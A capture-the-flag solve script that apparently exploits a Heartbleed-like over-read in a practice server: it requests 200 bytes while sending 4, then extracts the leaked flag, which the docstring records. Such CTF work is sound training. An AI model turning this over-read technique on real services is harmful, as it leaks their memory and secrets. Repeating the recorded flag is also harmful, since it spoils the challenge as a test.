#!/usr/bin/env python3
"""
Heartbleed Exploit for Mason, Meridian Challenge
Author: CTF Solver
Purpose: Exploit Heartbleed-like vulnerability to leak flag from memory
Created: 2025-11-15
Expected Result: Flag should be leaked in the response
Produced Result: Successfully leaked flag: poctf{uwsp_n3v3r_w1ll_1_w4nd3r}
"""

from pwn import *

# Configuration
HOST = 'exp100-2.pointeroverflowctf.com'
PORT = 14662

def exploit():
    # Connect to the remote server
    conn = remote(HOST, PORT)

    # Receive the initial banner
    print(conn.recvuntil(b'Waiting for heart beat request...\n').decode())

    # Send Heartbleed payload:
    # Request 200 bytes but only send 4 bytes of actual data
    # This will cause the server to leak memory including the flag
    payload = b'200:AAAA\n'

    print(f"[*] Sending payload: {payload}")
    conn.send(payload)

    # Receive the response
    response = conn.recvuntil(b'Waiting for heart beat request', timeout=2)

    print("\n[*] Received response:")
    print(response.decode(errors='ignore'))

    # Try to extract the flag
    if b'poctf{' in response or b'flag{' in response:
        print("\n[+] FLAG FOUND!")
        # Extract and display the flag
        flag_start = response.find(b'poctf{')
        if flag_start == -1:
            flag_start = response.find(b'flag{')

        flag_end = response.find(b'}', flag_start)
        if flag_start != -1 and flag_end != -1:
            flag = response[flag_start:flag_end+1].decode()
            print(f"[+] Flag: {flag}")

    conn.close()

if __name__ == '__main__':
    exploit()
